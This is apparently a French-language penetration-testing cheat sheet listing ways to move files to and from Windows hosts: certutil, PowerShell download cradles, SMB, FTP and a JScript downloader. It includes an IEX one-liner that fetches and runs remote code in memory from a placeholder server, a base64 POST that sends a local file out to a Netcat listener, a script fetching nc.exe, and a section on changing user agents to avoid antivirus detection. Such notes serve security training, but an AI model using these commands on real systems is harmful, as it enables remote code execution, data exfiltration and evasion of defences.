# Windows File Transfers

## Certutil 

```sh
certutil -split -f -urlcache http://192.168.81.128/file.ext
```

## PowerShell

```c
(New-Object System.Net.WebClient).DownloadFile('http://SERVER/file.ext', 'c:\temp\output_file.ext')
```

Téléchargée et exécutée en mémoire

```c
IEX (New-Object Net.WebClient).DownloadString('http://SERVER/file.ext')

Invoke-WebRequest 'http://SERVER/file.ext' -UseBasicParsing | IEX
```

Invoke-WebRequest & Invoke-RestMethod

```sh
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\temp\file.ext' -Encoding Byte))
Invoke-WebRequest -Uri 'http://SERVER:PORT' -Method POST -Body $b64

## Après avoir récupéré les données base64 avec Netcat, la charge utile peut être décodée.
echo <base64> | base64 -d -w 0 > output_file.ext
```

**Éviter la détection des AV**

Changer le user agent et liste les User-Agent

```sh
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl


Invoke-WebRequest 'http://SERVER/file.ext' -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "C:\temp\output_file.ext"
```

## SMB

Mapper / Monter les disques

```sh
impacket-smbserver share . -smb2support
```

Monter le partage dans Ce PC

```c
net use Q: \\<IP>\share 
```

Acceder au partage en CLI

```c
PS> pushd \\<IP>\share
```

## FTP
Mettre ce contenu dans un fichier `ftp-script.txt`

```sh
open <IP>
anonymous
anonymous
lcd C:\Temp
get nc.exe
quit
```

Se connecter au FTP en utilisant le fichier `ftp-script.txt`

```sh
ftp -v -n -s:ftp-script.txt
```

## Javascript
Code dans un fichier `wget.js`

```js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```sh
cscript /nologo wget.js http://SERVER/file.ext output_file.ext
```
